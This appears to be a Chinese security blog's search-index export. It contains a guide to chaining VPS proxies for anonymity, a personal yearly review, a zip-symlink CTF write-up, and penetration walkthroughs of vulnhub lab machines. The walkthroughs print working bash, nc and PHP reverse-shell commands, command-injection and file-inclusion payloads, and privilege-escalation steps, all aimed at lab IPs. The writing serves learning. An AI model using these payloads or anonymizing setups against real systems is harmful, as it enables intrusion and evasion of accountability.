<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[VPS链搭建的两次尝试]]></title>
    <url>%2F2019%2F03%2F01%2FVPS%E9%93%BE%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%A4%E6%AC%A1%E5%B0%9D%E8%AF%95%2F</url>
    <content type="text"><![CDATA[在需要匿名的情况下使用代理服务器上网是必须的，也在网上找过一些资料，尝试了两种可靠的方案 前期准备准备3-4台vps，比特币购买，网上购买的渠道也很多。不过有些服务商虽然支持比特币支付，但是也需要绑定信用卡。可以在virmach上购买，只用绑定一个邮箱就行，完全可以用一些临时邮箱进行注册 方案1思路方案1是根据某师傅的ppt来的，大概思路如下 由此形成一个vps链条 具体细节如下 根据此拓扑图，我们尝试在本地实验搭建代理链条 本地搭建实验工具1234567891011121314151617test0: windows 10 IP: 安装openvpn客户端test1: ubuntu 16.4 IP:192.168.41.135 安装openvpn服务端test2: ubuntu 16.4 IP:192.168.41.136test3: ubuntu 16.4 IP:192.168.41.134test4: ubuntu 16.4 IP:192.168.41.137 整体思路在test0上通过openvpn拨号连接到test1，再将test1的流量通过test2转发到test3，test4用来检验流量出口，流量转发利用ssh进行（需开启ssh服务） 搭建过程 在test0上下载并安装openvpn客户端 在test1上搭建openvpn服务端 一条命令即可解决 1wget https://git.io/vpn -O install.sh &amp;&amp; bash install.sh 每运行一次这个install.sh文件，就能生成一个openvpn的配置文件 再拷贝到test0上打开即可 在test1上进行本地端口转发 通过本地端口转发，将发送到test1主机7777端口的请求，转发到远程主机test2的8888端口 1ssh -C -f -N -g -L localhost:7777:localhost:8888 root@192.168.41.136 在test3上进行远程端口转发 通过远程端口转发，将发送到test2主机8888端口的请求，转发到本地主机test3的9999端口 1ssh -C -f -N -g -R localhost:8888:localhost:9999 root@192.168.41.136 此时vpn链条打通了，ssh链条打通了 就差把两条链条合并成一条了 在test1上进行本地端口转发 通过本地端口转发，将本机的vpn端口流量转发到本机的ssh端口 1iptables -t nat -A PREROUTING -p tcp --dport 6666 -j REDIRECT --to-ports 7777 此时vps链条搭建完毕 检验此时在test4上利用python开启一个简易的web服务 1python -m SimpleHTTPServer 8000 在test0上安装运行curl 1curl 192.168.41.137:8000 test4上响应的还是test1（即openvpn服务器的IP） 目前还不清楚是哪里出的问题，所以也就没有进行下一步，跟小伙伴讨论下再说 方案2本地搭建方案2采用的是gost，一个很牛逼的go语言写的项目，可以替代ss的存在 在test1、test2、test3上分别执行命令监听相应端口 123nohup ./gost -L=socks://:7777 &amp;nohup ./gost -L=socks://:8888 &amp;nohup ./gost -L=socks://:9999 &amp; 另外，协议可以自行选择 12&gt; 代理协议类型(http, socks5, shadowsocks), transport: 数据传输方式(ws, wss, tls, http2, quic, kcp), 二者可以任意组合，或单独使用&gt; 此时test0安装win版本的gost客户端，命令行执行 1gost -L=:8080 -F=socks://192.168.41.135:7777 -F=socks://192.168.41.136:8888 -F=socks://192.168.41.134:9999 客户端会按照-F的顺序来一个一个的转发流量，并在本地建立一个8080端口的监听 接着在本地建立一个8080的代理即可 检验在test0上访问test4的web服务，会发现test4响应的是test3的IP，表明搭建成功 使用方法使用方法有两种方便一点 配置文件写死一种是把代理服务器地址写入shell配置文件.bashrc或者.zshrc 直接在.bashrc或者.zshrc添加下面内容 12export http_proxy=&quot;http://localhost:port&quot;export https_proxy=&quot;http://localhost:port&quot; 或者直接设置ALL_PROXY 1export ALL_PROXY=socks5://127.0.0.1:8080 别忘了 1source ~/.bashrc 此时命令行的所有流量都经过代理 利用proxychains这种方法要比上一种灵活 直接安装proxychains 1sudo apt install proxychains 编辑proxychains配置文件/etc/proxychains.conf，将最后的socks4 127.0.0.1 9095改为 1socks5 127.0.0.1 8080 此时配置就完成了，如果命令前加上proxychains的话，流量就会经过代理，否则不会 浏览器的代理设置就不用说了，跟bp抓包一样的设置 BTW此时已经完成了整个vps链的搭建，可是并没有完，需要删除路由，因为如果当其中某一台服务器的gost服务崩掉，就会泄漏我们的真实IP 因此需要在建立vpn链接后，将本机与目标的路由删除，此时才能算完成]]></content>
      <tags>
        <tag>环境配置</tag>
        <tag>匿名代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[杂七杂八的总结]]></title>
    <url>%2F2018%2F12%2F31%2F%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[惨淡的20182018年过的有些碌碌无为。技术上虽有进步，但还远远不够。下半年开始认真打了几场比赛，小伙伴们也很努力，进了两次线下，技术和经验不够，导致被打的很惨。练习的方式很多，可以和小伙伴自己搭建awd环境进行演练，每个cms不管大众小众，都值得去分析复现其存在的漏洞。我们这个层次所能接触到的线下赛几乎都是常规cms的漏洞，偶尔会放0day环境，不过这都些都是可以靠自己平时的积累来一一解决的，方法都在那，就看自己愿不愿去做。 实战能力还需要提高，小型网站可以拿下，刷src还是能力不够。跟sn00py师傅交流过，信息收集这块在挖src是第一等重要的事，也是很大的难点，很多站点并不清楚是属于哪个src旗下的产品业务。 今年写的代码不多，利用Django框架和ThinkPHP分别写了个博客，用swift写了个简单的ios游戏。 2018年过的也有些苦。苦为佛教四真谛之一 苦 生就是苦的业因，生命就是受苦，从生到死要经历一个个痛苦的阶段，这是苦谛。 集 促成生的原因是对生命的渴求，生后的肉欲、视欲和对生命的骄傲促使人们从一生转向另一生，这就是集谛。 灭 根治这种生就得消除对生命的渴求 办法是，彻底绝除一切邪欲，不让它们占据头脑，或是把它们清除出去，不使自己的头脑里有一点装进邪念的余地，这就是灭谛。 道 八正道。即道谛。 第一即为众生皆苦。每天枯燥的学习技术，苦也充实。每逢期末就开始放纵的毛病还是没改掉，最近写的文章和笔记都懒得放上博客，就趁这次回顾2018的机会，把之前未放上的文章笔记一并上传。 这一年和之前班级的小伙伴们联系的更少了，毕竟之前也没有什么作为枢纽的东西来维持关系，只是单纯的喜欢那种感觉。舍也有得，和班上小伙伴们的关系更近了一步，认识了一群一起嘻嘻哈哈的人，和之前的小伙伴不同，虽然平时的交流都是些粗鄙之语，但我觉得这是我更想要的。 感情上也没有那么顺利，分开后更多的还是愧疚，愿其安好两相忘吧。 今年没有像去年那样经常和家里联系了，忙真的不是借口，一个学生再忙能有多忙。 未知的2019人丑就要多读书，但不仅仅限制在国内技术文章、国外paper，因为我明白我的生活不只有网络安全，希望这一年能坚持阅读更多关于社科的书。 很喜欢奥美广告里说的 我害怕阅读的人，一跟他们谈话，我就像一个透明的人，苍白的脑袋无法隐藏 我害怕阅读的人，我祈祷他们永远不知道我的不安，免得他们会更轻易的击垮我，甚至连打败我的意愿都没有，他们知道，无知在小孩身上才可爱，而我已经是一个成年的人。 我害怕阅读的人，他们懂得生命太短，人总是聪明的太迟，他们的一小时就是我的一生。 我害怕阅读的人，尤其是，还在阅读的人 班主任也多次提到过学习其他东西的重要性，比如理财、心理学，要学的真的太多了。如果把自己禁锢在安全这个行业，对以后的个人发展是很不利的，不仅仅是职场的发展，更多的是人的成长。通过阅读能体会到作者很长一段时间的所感所悟，也能使自己静下来。sn00py师傅和lem0n师傅就是属于那种能静下来学习东西的人，我太浮躁。 来年的博客里不应该只出现安全技术文章或者笔记，也应该有读书笔记。读书不做笔记的话等于白看，相信在不久的未来，会和现在的自己产生很大的进步。 技术层面也需要更多的提高，今年需要更多的进行实战，因为面临着实习的问题，公司只在意你能给其创造多少价值。下学期学新技术的时间可以就会相对少一些，更多是在实战中巩固之前的知识。 一定要学会珍惜，不管是珍惜时间珍惜金钱还是珍惜眼前的人，确实因为这个失去了很多。不遗憾失去的，能学会珍惜现在拥有的就好。 虽然文笔越来越差了，但是不准备提高了，觉得意义不大 把烟戒了，对自己和身边的人都不好。 要找工作自己养活自己了，暑假找个好一点的实习，争取进国安吧，想去重庆吃梅菜扣肉饼 2019，幸会]]></content>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软连接]]></title>
    <url>%2F2018%2F12%2F31%2F%E8%BD%AF%E8%BF%9E%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[前言因为软链接爆出的漏洞很多，比如Gitlab任意文件读取漏洞、Nginx提权漏洞等等 Linux下的软链接和Windows下的快捷方式道理类似，但是有区别，Windows直接操作快捷方式本身，Linux直接软链接指向的对象。通俗点说，在Windows下编辑快捷方式就是编辑的快捷方式本身，而在Linux编辑软链接是编辑的软链接指向的文件，例如 Linux： # ls -s test.txt test # php -r &quot;echo file_get_contents(&apos;test.txt&apos;);&quot; 123 # php -r &quot;echo file_get_contents(&apos;test&apos;);&quot; 123 Windows: &lt;?php echo file_get_contents(&quot;test.txt&quot;); echo &quot;&lt;br /&gt;&quot;; echo file_get_contents(&quot;test.txt - 快捷方式.lnk&quot;); ?&gt; 运行结果为 123 L�F� ���0�{�p ���{�P�l��{�P�O� �:i��+00�/C:\V1phpStudy&gt;�*phpStudy^1PHPTutorialD�*PHPTutorialF1kM,cWWW4�kM+ckM,c*�&apos;WWWV2nM�M test.txt&gt;�nMDLnM�M*82test.txtS-R���hC:\phpStudy\PHPTutorial\WWW\test.txt .\test.txtC:\phpStudy\PHPTutorial\WWW� ��1SPS0�%��G��`���%  test.txt�e,g�ech@�1�{� @���{�e1SPSLX�㈷ZJ� ZDɬ�IC:\phpStudy\PHPTutorial\WWWy1SPS�jc(=�����O��]%C:\phpStudy\PHPTutorial\WWW\test.txt`�Xwindows7�t���A�� � �U]�q����B 例子这次的HCTF就出了一道zip软链接任意文件读取（虽然只是其中一步） 进入题目要求登录 登录后让上传一个zip文件 随便制作一个txt文件的压缩zip文件，上传后返回了txt文件的内容 看来后台自动unzip并cat了文件，联想到zip软链接任意文件读取，制作一个读取/etc/passwd的软链接测试 ln -s /etc/passwd link zip --symlinks test.zip link 将这个test.zip文件上传可以看到成功读取到了/etc/passwd 这里有个小插曲，本来一开始就读取到了，但是我感觉这个不像/etc/passwd文件（mac下和linux下不一样），就纠结了好久。为什么不在docker上搭建呢，嫌麻烦，反正都给了源码 看看请求信息 可以看到上传一个正常的zip文件时有一个cat命令读取的，而下面构造的特殊zip文件却没有，这是因为报错爆出的错误信息 我们再看看核心源码 extract_path = file_save_path + &apos;_&apos; os.system(&apos;unzip -n &apos; + file_save_path + &apos; -d &apos;+ extract_path) read_obj = os.popen(&apos;cat &apos; + extract_path + &apos;/*&apos;) file = read_obj.read() read_obj.close() os.system(&apos;rm -rf &apos; + extract_path) 可以看到后台先unzip文件，再cat压缩文件内部的文件，而我们构造的zip文件内部的文件就是/etc/passwd，因此就成功执行了 cat /etc/passwd 命令 关于题目的分析就到这里，后面的内容不属于本文所讨论的范畴了 getshell 应用场景：当我们找到一个上传+zip软链接漏洞的时候，不能指定解压路径也不能getshell，可以利用下面的方式来执行任意命令（某个师傅的一个议题，需要有执行权限） 新建一个文件，赋予其权限并将其与其父文件夹压缩 vim test/test.sh //echo test chmod 777 test/test.sh zip -r a.zip test/a.sh 接着删除这个文件夹，并建立某个文件夹的软链接到本文件夹下（有执行权限的文件夹，此处以/tmp文件夹为例），然后将此软链接压缩 rm -rf test ln -s /tmp test zip --symlinks -r b.zip ./test 然后解压b.zip，会提示test软链接已经存在，是否替换，选择y 再解压a.zip，就会看到a.sh已经跑到了/tmp目录下 运行/tmp/a.sh就能执行脚本了]]></content>
  </entry>
  <entry>
    <title><![CDATA[靶机渗透_Breach1]]></title>
    <url>%2F2018%2F12%2F31%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-Breach1%2F</url>
    <content type="text"><![CDATA[信息收集IP：192.168.110.140 端口：1nmap 192.168.110.140 -p 1-65535 这个靶机开了一千多个端口竟然 筛选了一些常用端口 12345621/tcp open ftp22/tcp open ssh23/tcp open telnet25/tcp open smtp70/tcp open gopher80/tcp open http 服务器：端口太多了，就不用nmap去判断服务器了，根据端口初步判断是Linux服务器 因为是靶机，所以whois信息啊二级域名啊之类的就不搞了 web信息收集访问80端口的web服务 右键源码注释有一串字符串 1Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo base64解码得到 1cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh 再次解码得到 1pgibbons:damnitfeel$goodtobeagang$ta 有点像账号和密码，先留着 源码还有个链接 1http://192.168.110.140/initech.html 还有个图片链接 1http://192.168.110.140/images/milton_beach.jpg 访问/images文件夹得到一张图片提示 看来要先看看源码才行 访问第一个链接，右键源码发现有一个impresscms和一串提示字符串还有一个邮箱，应该是管理员的 123&lt;!--I&apos;m sitting on a beach reading your email! --&gt;webmaster@breach.local 突破点应该在cms上 找到两个个源码泄漏 12http://192.168.110.140/impresscms/modules/profile/http://192.168.110.140/impresscms/modules/banners/ 但是显示没有权限访问 用之前解码的账号登录试试，成功登录 Inbox好像是个邮箱，还有三封未读消息，一一读了下，点击回复就能看到聊天记录，其中一个貌似得到了点有用的信息 访问之就能拿到一个什么密钥 但是打开乱码，不知道怎么利用，再看看别的 在View Account标签那里的Contributions点开有一个链接，还是在源码看到的，不然太难发现了。进去有一个pcap的文件链接，还有一个tomcat:tomcat的账号，还不知道有什么用，先留着 下载后翻了下，都是些ssl加密过的数据，前面给了个证书，但是不知道该怎么解密啊，网上有个方法是利用java的keytool 密码就是tomcat 然后导出证书 接着将证书导入Wireshark开始解密数据： 先用Wireshark打开目标文件包，然后首选项=&gt;Protocols=&gt;SSL=&gt;edit=&gt;导入证书 现在数据包里的数据就是明文了，新知识点，学到了 包里拿到了一个账号 1tomcat:Tt\5D8F(#!*u=G)4m7zB 还有这么个地址 还有个后门 漏洞利用这里有个大坑，上面拿到的地址是https的，但是证书已经过期，只有找一个老一点的浏览器才能访问，我折腾了好久 利用上面数据包里拿到的账号密码登录就行了 tomcat版本是6.0.39，后门不能访问，但是是asp的，尝试部署war包getshell 可以getshell，但是后台貌似有个脚本在定时删除木马，也不像狗，很迷，就利用这个shell在www，目录下留了个稳定的木马，菜刀连接就OK了 提权查看用户及服务器信息 expdb上没找到合适的提权脚本，翻翻文件，这两个文件有点可疑 查看里面是数据库连接信息 那看能不能数据库提权 之前在本机连接过数据库，是不能连接的，那反弹代理再连接试试 1echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.110.220/4444 0&gt;&amp;1&quot; | bash 这里还有个坑，一开始我并没有在这个shell反弹shell，是在上面提到的那个稳定的shell反弹的，但是那个shell并不能反弹，只有这个shell才可以 使用上面得到的mysql账号密码登录 1mysql -u root -p 但是一直加载不出来是什么意思 瞎敲了几次后发现要在退出数据库后才会回显 翻了下数据库里的东西，没啥有用的，那就直接查询下用户试试 123use mysql;select user,password from user; //千万别select *，查询出来会乱quit; milton用户的密码看样子是md5，扔到网站解密 debian-sys-maint用户的密码mysql加密只知道是两次SHA1夹杂一次unhex，但是只在吐司查到，苦于没有账号 切换到milton用户，报错 问题不大， 上次遇到过这个问题， 用python调用bash就行了 在milton用户跟目录下发现有一张图片一个脚本 用scp命令将其发送到本地 1scp 目标文件路径 用户名@IP:/路径/ 图片提示更底层？难道是有隐写 但是脚本源码打开是说这里没有东西 宁可信其有不可信其无，看看图片 但是各种我所知道的隐写试了一圈，没发现什么东西 还有一个blumbergh用户 看来需要找到这个用户的密码，提权到这个用户 查看历史命令，没发现什么东西 看了提示，是说隐写在别的图片里了，就把web目录下的别的图片都下载下来，一个一个试了下，发现bill.png里有别的东西 分离一下 1dd if=bill.png of=123.txt skip=41 bs=1 查看123.txt，在末尾看到一串字符 后面了解到，可以直接用exiftool直接查看exif信息 成功提权到blumbergh 但是还是不能访问root文件夹，查看历史命令看看 查看tidyup.sh文件 12345678#!/bin/bash#Hacker Evasion Script#Initech Cyber Consulting, LLC#Peter Gibbons and Michael Bolton - 2016#This script is set to run every 3 minutes as an additional defense measure against hackers.cd /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf 每三分钟删除一次。。。。那前面的疑惑就能解开了 还是root权限 而且脑子里突然多了个思路，既然它每三分钟运行一次，那如果在里面写入shell的话，不就可以提权到root权限了 但是vim一下发现没有写入权限啊，再看看sudo的权限 当前的blumbergh用户可以以root权限运行/usr/bin/tee和/usr/share/cleanup/tidyup.sh 这个tee是什么，搜下了 tee命令用于将数据重定向到文件，另一方面还可以提供一份重定向数据的副本作为后续命令的stdin。简单的说就是把数据重定向到给定文件和屏幕上。 语法 12&gt; tee(选项)(参数)&gt; &gt; 选项 123&gt; -a：向文件中重定向时使用追加模式；&gt; -i：忽略中断（interrupt）信号。&gt; &gt; 参数 文件：指定输出重定向的文件。 在终端打印stdout同时重定向到文件中： 例如： 并且，1.txt会被删除 那就可以将某个shell文件写入这个tidyup.sh来提权了 没有写入权限竟然，换个目录试试 没有这个命令？用上面得到的bee命令路径试试 还是没权限 成功！ 为什么不能通过ssh发送到本地 那将其拷贝到其他文件夹再发出来好了 1cp flair.jpg /home/blumbergh/1.jpg 再发送到本地 总结整体思路 web端口先拿到cms的管理员账号 cms邮箱拿到ssl密钥 View Account标签那里拿到一个数据包以及一个tomcat:tomcat账号 利用上面拿到的ssl密钥解密数据包拿到网站后台以及账号密码 部署war包getshell 后台拿到mysql配置信息 反弹shell登录mysql 拿到milton账号密码 web目录图片隐写拿到blubergh用户密码 利用bee命令写入sh任务脚本提权 学到的新东西 利用密钥找到私钥来解密数据包 tomcat部署war包getshell 利用bee命令写入文件]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[靶机渗透_acid]]></title>
    <url>%2F2018%2F12%2F31%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-acid%2F</url>
    <content type="text"><![CDATA[信息收集IP：123nmap -sP 192.168.1.0/24 Nmap scan report for acid.lan (192.168.1.138) Host is up (0.029s latency). 端口：​ 一开始想到没有禁ping或者其他之类的，就直接用nmap 192.168.1.138，但是显示的是 123456nmap 192.168.1.138 Nmap scan report for acid.lan (192.168.1.138) Host is up (0.0080s latency). All 1000 scanned ports on acid.lan (192.168.1.138) are closed Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds ​ 不应该呀，所有端口都关了还玩个屁，默认只扫描1000个，那我们全部扫描试试 123456nmap 192.168.1.138 -p 1-65535 Nmap scan report for acid.lan (192.168.1.138) Host is up (0.018s latency). Not shown: 65534 closed ports PORT STATE SERVICE 33447/tcp open unknown ​ 可以看到存在一个端口 服务器：​ 虽然打开虚拟机的时候就知道是ubuntu了，但是还是要流程走一遍啊 123456nmap -sV 192.168.1.138 Nmap scan report for acid.lan (192.168.1.138) Host is up (0.0027s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 33447/tcp open http Apache httpd 2.4.10 ((Ubuntu)) 目录：​ 扫描一波目录，看会不会有信息泄漏 12345python webdirscan.py http://192.168.1.138:33447/ /Challenge cake.php include.php hacked.php 因为这是靶机，至于什么子域名啊whois信息啊之类的就免了 漏洞发现1、图片在信息收集中我们可以看到33447端口开放的是一个apache web服务，访问一下有提示信息需要一个secret keys 右键源码可以看到一串16进制的字符串，解码得到： 1d293LmpwZw== 再base64解码看看 1wow.jpg 访问显示404，看来是路径不对，再看看源码 1234567html &#123; background: url(images/bg.jpg) no-repeat center center fixed; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; &#125; 可以看到有一个images目录，加入路径访问得到一张图片 但是后续不知道该怎么办了，因为可用的点实在太少了，难道就是从图片入手？ 2、cake.php访问得到 看来不能直接利用，但是网站标题变成了/Magic_Box 访问是403 3、include.php 访问没有权限，但是尝试包含，发现存在漏洞 1http://192.168.1.138:33447/Challenge/include.php?file=/etc/passwd 4、hacked.php 看来有戏，估计是一个后门 输入长度限制在20个字符，常规的sql注入和xss都试了下不行 梳理有一个成功的图片，有一个后门，有一个文件包含漏洞，有一个403的路径/Magic_Box，看来要在图片上做文章 试了常规隐写，发现用ihex打开时，在文件末尾有一串ascii字符串 1;37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34 ascii解码得到 17aee0f6d588ed9905ee37f16a7c610d4 应该是一串32位 md5 去解密试试 这应该就是前面所提示的secret keys，这个会不会就是后门密码 输入还是一样的页面 不是转机的转机后面测试再访问include.php时，显示了不同的页面 猜测是前面在hacked.php输入了secret keys的原因 但是还是只能包含文件，和之前没啥区别，包含下已知的三个PHP文件试试 123456hacked.php: 0x5933566a4c6e4a34626e413dcake.php: 0x5933566a4c6e4a34626e413dinclude.php: 是空的 解码后为cuc.rxnp，这个不是路径，也不是hacked.php的id 陷入了江局 真正的转机回忆起之前扫出的Magic_Box目录访问是403，当时没当回事，尝试扫下文件 12low.phpcommand.php 访问low.php是空白，访问command.php有东西 这种在以前的ctf中遇到过，一般考点是任意命令执行，构造 1127.0.0.1;ls 还真是 getshell写入一句话连接蚁剑翻翻文件吧 但是没有写入权限，那我们直接反弹shell试试，用bash反弹失败，利用p神的php反弹成功 1php -r '$sock=fsockopen("192.168.1.179",6789);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' 但是这里有个坑，需要url编码一下才行，所以构造的url为： 1127.0.0.1;%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%39%32%2e%31%36%38%2e%31%2e%31%37%39%22%2c%36%37%38%39%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27 拿到了shell，查看当前用户 查看所有用户 查看版本 但是没有合适的exp，就算有也不能使用，因为wget命令不能使用，没法下载 翻文件发现了两个类似邮箱和密码的文件 想去cake.php登录，发现不行，翻看一些文件的时候发现没有权限，用su命令不行，显示： 1su: must be run from a terminal 在stack overflow上找到了一个利用python调用本地/bin/bash的方法 提权可以使用su命令了，但是切换root用户需要密码，利用之前翻到的邮箱密码不行。有一个sql文件。里面有密码和盐值，但是这么长不知道什么加密，放弃 查看history都是自己的命令 做不下去了，思路没有了，看了下别人的过程，原来是查看用户的文件，找到一个流量包 找到一个hint.pcapng 可以利用如下命令讲其发送到本机，前提是本机要开启ssh服务 1scp /sbin/raw_vs_isi/hint.pcapng 用户名@IP:/路径/ 本地利用Wireshark分析 这个包里有服务器里的一个用户名 密码应该就是1337hax0r 可以成功切换的saman用户 但是可以看到还是不能访问root文件夹，在流量包里也没找到root用户密码，尝试用相同密码到root 成功提权 总结这个环境有点绕，会有很多看似正确的点，其实都是扰乱思路的 整体思路 网站右键源码图片隐写拿到一个密码 扫目录发现/Challenge/cake.php、include.php、hacked.php。Magic_Box/low.php、command.php command.php任意命令执行php反弹shell 用户文件找到hint.pcap数据包拿到root用户密码 学到的新东西 PHP反弹shell python本地调用/bin/bash]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[靶机渗透_rickdicul]]></title>
    <url>%2F2018%2F12%2F31%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-rickdicul%2F</url>
    <content type="text"><![CDATA[信息收集IP1192.168.1.163 端口12345678PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh?80/tcp open http Apache httpd 2.4.27 ((Fedora))9090/tcp open ssl/zeus-admin?13337/tcp open tcpwrapped22222/tcp open ssh OpenSSH 7.5 (protocol 2.0)60000/tcp open tcpwrapped 操作系统1Ubuntu 14.04.5 LTS (GNU/Linux\SF: 4.4.0-31-generic\ x86_64 漏洞挖掘80端口访问就一张图片，右键源码也没发现什么有价值的东西，除了一个用户名MORTY 扫目录发现一个robots.txt 12345They&apos;re Robots Morty! It&apos;s ok to shoot them! They&apos;re just Robots!/cgi-bin/root_shell.cgi/cgi-bin/tracertool.cgi/cgi-bin/* 第一个访问显示 1--UNDER CONSTRUCTION-- 第二个访问是执行trace命令的组件 第三个404 看样子利用点应该在第二个目录，当构造 1127.0.0.1;ls 的时候，列出了当前目录文件，任意命令执行！ 试试反弹shell 1127.0.0.1;bash -i &gt;&amp; /dev/tcp/192.168.1.179/4444 0&gt;&amp;1 测试发现并没有反弹shell，nc反弹成功 1127.0.0.1;nc -e /bin/bash 192.168.1.179 4444 但是这里利用python调用本地bash失败了，就将就用吧 但是读取tracertool.cgi和root_shell.cgi这两个文件都是猫的样子，猜测应该是每次读取文件输出行数有限制 1234567891011121314 _ | \ | | | | |\ | | /, ~\ / /X `-.....-------./ / ~-. ~ ~ | \ / | \ /_ ___\ / | /\ ~~~~~ \ | | | \ || | | |\ \ || ) (_/ (_/ ((_/ 发现不止读这两个文件，读一些敏感文件也是这样 那看来不是限制行数了，可以利用more绕过，但是尝试后发现more命令没有回显，解决方案是要么在浏览器端执行这个命令，或者利用nl命令 手动读取到html目录下存在一个passwords文件夹 拿到一个flag 1FLAG&#123;Yeah d- just don&apos;t do it.&#125; - 10 Points passwords.html下的内容为 1Wow Morty real clever. Storing passwords in a file called passwords.html? You&apos;ve really done it this time Morty. Let me at least hide them.. I&apos;d delete them entirely but I know you&apos;d go bitching to your mom. That&apos;s the last thing I need. 但是其右键源码有个一个密码 想读html的上层目录，读取不了了，有限制，看来这个密码有用处 9090端口访问拿到一个flag 1FLAG &#123;THERE IS NO ZEUS, IN YOUR FACE!&#125; - 10 POINTS 这是一个登录页面，但是不能输入密码，没有登录按钮，到时收获一个serverlocalhost/localdomain 先放一放 21端口发现ftp服务器可以匿名登录，利用filezilla登录 拿到一个flag 1FLAG&#123;Whoa this is unexpected&#125; - 10 Points 13337端口tcpwrapped服务，尝试用nc链接 60000端口同样尝试利用nc链接，发现这是一个后门啊 这个还可以执行命令，但是好像只能执行几个命令 逃逸不了卧槽试了好久 就剩22和22222端口，但是22端口好像不是一个ssh服务，22222才是，我用上面得到的密码加网站首页的用户名登录，发现不行 提权先查看下用户 注意到这个Summer用户，查看当前用户进程 查看当前用户文件 有点意思，原来已经帮我们准备好了，运行看看 但是运行发现没有反应，这是什么操作，算了先放一放吧 上面提到的Summer用户的密码说不定就是之前的那个winter，ssh登录试试 成功拿到一个flag home目录下还有两个用户，用户目录下有东西 都发到本地看看 1scp /sbin/raw_vs_isi/hint.pcapng 用户名@IP:/路径/ 但是发送RickSanchez用户目录下的文件时，报错 1ThisDoesntContainAnyFlags: not a regular file 原因是没有权限，加个-r参数解决 首先查看Safe_Password.jpg文件，用ihex打开拿到journal.txt.zip的密码 打开journal.txt，拿到一些信息和flag，还有safe文件的密码，下面用得到 12345Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?Anyway. Here it is:FLAG: &#123;131333&#125; - 20 Points 再看RICKS_SAFE文件夹下，ThisDoesntContainAnyFlags文件夹下有一个txt文件 12hhHHAaaaAAGgGAh. You totally fell for it... Classiiiigihhic.But seriously this isn&apos;t a flag.. 还有有一个可执行文件，但是执行报错，估计要在目标机器上执行才行 但是还是报错 1Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS! 加上刚刚拿到的密码，这次显示权限不足，把这个文件拷贝到Summer文件夹下就好了 123456789decrypt: FLAG&#123;And Awwwaaaaayyyy we Go!&#125; - 20 PointsRicks password hints: (This is incase I forget.. I just hope I don&apos;t forget how to write a script to generate potential passwords. Also, sudo is wheely good.)Follow these clues, in order1 uppercase character1 digitOne of the words in my old bands name.� @ Ricks密码的组成由以下部分 一个大写字母，猜测在开头 一个数字 但是他喜欢的乐队是什么，试试关键字搜索，用已知的三个用户名搜下，拿到乐队名The Flesh Curtains 写个脚本生成下字典 12345678910# -*- coding:utf-8 -*-fo = open("pass.txt","w")l = ['The', 'Flesh', 'Curtains']for i in range(65, 91): for j in range(0, 10): j = str(j) for k in l: fo.write(chr(i) + j + k) fo.write("\n") 爆破得到RickSanchez的密码 1P7Curtains 成功提权到RickSanchez，看看此用户能以root权限执行哪些命令 所有？？？？意思是可以直接提权到root么 1sudo su - 密码一样的，成功拿到flag 11 FLAG: &#123;Ionic Defibrillator&#125; - 30 points 总结整体思路 robots.txt发现漏洞目录getshell passwords目录下拿到summer密码，提权到summer 根据提示生成字典爆破出root用户密码 学到的新东西 cat命令不回显，可以利用nl或者more命令绕过]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[靶机渗透_wakada]]></title>
    <url>%2F2018%2F12%2F31%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-wakada%2F</url>
    <content type="text"><![CDATA[信息收集IP1192.168.1.176 端口12345PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.10 ((Debian))111/tcp open rpcbind 2-4 (RPC #100000)3333/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)58428/tcp open status 1 (RPC #100024) 系统1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 目录扫了下目录，发现字典里的目录都是200，并且访问显示的都是同一个页面，所以目录没得到什么有价值的，只有几个空的目录 漏洞挖掘在右键源码看到一个参数 但是访问 1http://192.168.1.176/?lang=fr 显示另外一种语言的说明，传入其他参数就不显示说明 尝试了很多方式，sql注入xss什么的都试了，最后发现是本地文件包含 1http://192.168.1.176/?lang=php://filter/read=convert.base64-encode/resource=index index核心源码为 1234567891011121314151617&lt;?php$password ="Niamey4Ever227!!!" ;//I have to remember itif (isset($_GET['lang']))&#123;include($_GET['lang'].".php");&#125;?&gt;&lt;?phpif (isset($_GET['lang']))&#123; echo $message;&#125;else&#123;?&gt; 